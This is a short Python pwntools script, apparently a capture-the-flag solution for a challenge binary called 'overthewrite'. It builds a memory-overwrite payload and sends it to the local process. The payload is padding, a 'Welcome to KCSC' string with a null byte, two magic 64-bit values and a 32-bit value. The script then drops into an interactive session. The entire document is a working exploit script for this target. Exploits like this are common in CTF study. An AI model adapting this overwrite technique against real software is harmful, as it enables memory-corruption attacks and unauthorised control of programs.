from pwn import *

r = process("./overthewrite")

payload = b'a'*32 + b'Welcome to KCSC\x00        ' + p64(0x215241104735F10F) + p64(0xdeadbeefcafebabe) + b'a'*4 + p32(0x13371337)
r.sendline(payload)
r.interactive()